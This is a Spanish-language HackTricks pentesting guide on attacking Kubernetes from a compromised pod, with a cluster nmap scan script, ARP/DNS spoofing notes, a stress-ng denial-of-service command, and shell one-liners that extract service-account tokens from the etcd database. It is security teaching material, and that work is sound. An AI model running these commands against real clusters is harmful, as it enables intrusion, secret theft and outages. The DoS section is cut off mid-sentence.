# Atacando Kubernetes desde dentro de un Pod

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Pod Breakout**

**Si tienes suerte, podr치s escapar de 칠l al nodo:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Escapando del pod

Para intentar escapar del pod, primero podr칤as necesitar **escalar privilegios**, algunas t칠cnicas para hacerlo:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Puedes comprobar estos **escape de docker para intentar escapar** de un pod que hayas comprometido:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abusando de los privilegios de Kubernetes

Como se explica en la secci칩n sobre **enumeraci칩n de Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Por lo general, los pods se ejecutan con un **token de cuenta de servicio** dentro de ellos. Esta cuenta de servicio puede tener algunos **privilegios adjuntos** que podr칤as **abusar** para **moverte** a otros pods o incluso para **escapar** a los nodos configurados dentro del cl칰ster. Comprueba c칩mo hacerlo en:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abusando de los privilegios de la nube

Si el pod se ejecuta dentro de un **entorno de nube**, podr칤as ser capaz de **filtrar un token desde el punto final de metadatos** y escalar privilegios us치ndolo.

## Buscando servicios de red vulnerables

Como est치s dentro del entorno de Kubernetes, si no puedes escalar privilegios abusando de los privilegios actuales de los pods y no puedes escapar del contenedor, deber칤as **buscar servicios potencialmente vulnerables.**

### Servicios

**Para este prop칩sito, puedes intentar obtener todos los servicios del entorno de Kubernetes:**

```
kubectl get svc --all-namespaces
```

Por defecto, Kubernetes utiliza un esquema de red plano, lo que significa que **cualquier pod/servicio dentro del cl칰ster puede hablar con otros**. Los **espacios de nombres** dentro del cl칰ster **no tienen restricciones de seguridad de red por defecto**. Cualquiera en el espacio de nombres puede hablar con otros espacios de nombres.

### Escaneo

El siguiente script de Bash (tomado de un [taller de Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) instalar치 y escanear치 los rangos de IP del cl칰ster de Kubernetes:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube () 
{ 
    nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
    local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');                                                                  
    local SERVER_RANGES=" ";
    SERVER_RANGES+="10.0.0.1 ";
    SERVER_RANGES+="10.0.1.* ";
    SERVER_RANGES+="10.*.0-1.* ";
    nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

Consulta la siguiente p치gina para aprender c칩mo podr칤as **atacar servicios espec칤ficos de Kubernetes** para **comprometer otros pods/todo el entorno**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Sniffing

En caso de que el **pod comprometido est칠 ejecutando alg칰n servicio sensible** donde otros pods necesiten autenticarse, podr칤as ser capaz de obtener las credenciales enviadas desde los otros pods **sniffeando las comunicaciones locales**.

## Suplantaci칩n de red

Por defecto, t칠cnicas como el **ARP spoofing** (y gracias a eso el **DNS Spoofing**) funcionan en la red de Kubernetes. Entonces, dentro de un pod, si tienes la **capacidad NET\_RAW** (que est치 ah칤 por defecto), podr치s enviar paquetes de red personalizados y realizar **ataques MitM a trav칠s del ARP Spoofing a todos los pods que se ejecutan en el mismo nodo.**\
Adem치s, si el **pod malicioso** se est치 ejecutando en el **mismo nodo que el servidor DNS**, podr치s realizar un **ataque de DNS Spoofing a todos los pods del cl칰ster.**

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## DoS del nodo

No hay especificaci칩n de recursos en los manifiestos de Kubernetes y **no se aplican rangos de l칤mite** para los contenedores. Como atacante, podemos **consumir todos los recursos donde se est치 ejecutando el pod/despliegue** y privar de recursos a otros y causar un DoS para el entorno.

Esto se puede hacer con una herramienta como [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):

```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```

Puedes ver la diferencia mientras se ejecuta `stress
### Pivotar a la nube

Si el cl칰ster es administrado por un servicio en la nube, generalmente el **nodo tendr치 un acceso diferente al punto final de metadatos** que el Pod. Por lo tanto, intente **acceder al punto final de metadatos desde el nodo** (o desde un pod con hostNetwork en True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Robar etcd

Si puede especificar el [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) del nodo que ejecutar치 el contenedor, obtenga una shell dentro de un nodo de plano de control y obtenga la **base de datos etcd**:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

Los nodos de plano de control tienen el **rol de maestro** y en **cl칰steres administrados en la nube no podr치 ejecutar nada en ellos**.

#### Leer secretos de etcd

Si puede ejecutar su pod en un nodo de plano de control utilizando el selector `nodeName` en la especificaci칩n del pod, es posible que tenga un acceso f치cil a la base de datos `etcd`, que contiene toda la configuraci칩n del cl칰ster, incluidos todos los secretos.

A continuaci칩n se muestra una forma r치pida y sucia de obtener secretos de `etcd` si se est치 ejecutando en el nodo de plano de control en el que se encuentra. Si desea una soluci칩n m치s elegante que inicie un pod con la utilidad de cliente `etcd` `etcdctl` y use las credenciales del nodo de plano de control para conectarse a etcd donde sea que se est칠 ejecutando, consulte [este ejemplo de manifiesto](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**Compruebe si `etcd` se est치 ejecutando en el nodo de plano de control y vea d칩nde est치 la base de datos (esto est치 en un cl칰ster creado por `kubeadm`)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

Salida:

```bash
data-dir=/var/lib/etcd
```

**Vea los datos en la base de datos etcd:**

```bash
strings /var/lib/etcd/member/snap/db | less
```

**Extraiga los tokens de la base de datos y muestre el nombre de la cuenta de servicio**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**Mismo comando, pero algunos greps para devolver solo el token predeterminado en el espacio de nombres kube-system**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

Salida:

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

### Persistencia de Pods est치ticos / espejados

Los _Pods est치ticos_ son administrados directamente por el demonio kubelet en un nodo espec칤fico, sin que el servidor API los observe. A diferencia de los Pods que son administrados por el plano de control (por ejemplo, un Deployment); en su lugar, el **kubelet observa cada Pod est치tico** (y lo reinicia si falla).

Por lo tanto, los Pods est치ticos siempre est치n **vinculados a un Kubelet** en un nodo espec칤fico.

El **kubelet intenta autom치ticamente crear un Pod espejo en el servidor API de Kubernetes** para cada Pod est치tico. Esto significa que los Pods que se ejecutan en un nodo son visibles en el servidor API, pero no se pueden controlar desde all칤. Los nombres de los Pods tendr치n un sufijo con el nombre de host del nodo con un gui칩n inicial.

{% hint style="danger" %}
El **`spec` de un Pod est치tico no puede hacer referencia a otros objetos API** (por ejemplo, ServiceAccount, ConfigMap, Secret, etc. Por lo tanto, **no puede abusar de este comportamiento para lanzar un pod con una cuenta de servicio arbitraria** en el nodo actual para comprometer el cl칰ster. Pero podr칤a usar esto para ejecutar pods en diferentes espacios de nombres (en caso de que sea 칰til por alguna raz칩n).
{% endhint %}

Si est치 dentro del host del nodo, puede hacer que cree un **Pod est치tico dentro de s칤 mismo**. Esto es bastante 칰til porque podr칤a permitirle **crear un pod en un espacio de nombres diferente** como **kube-system**.

Para crear un Pod est치tico, la [**documentaci칩n es de gran ayuda**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/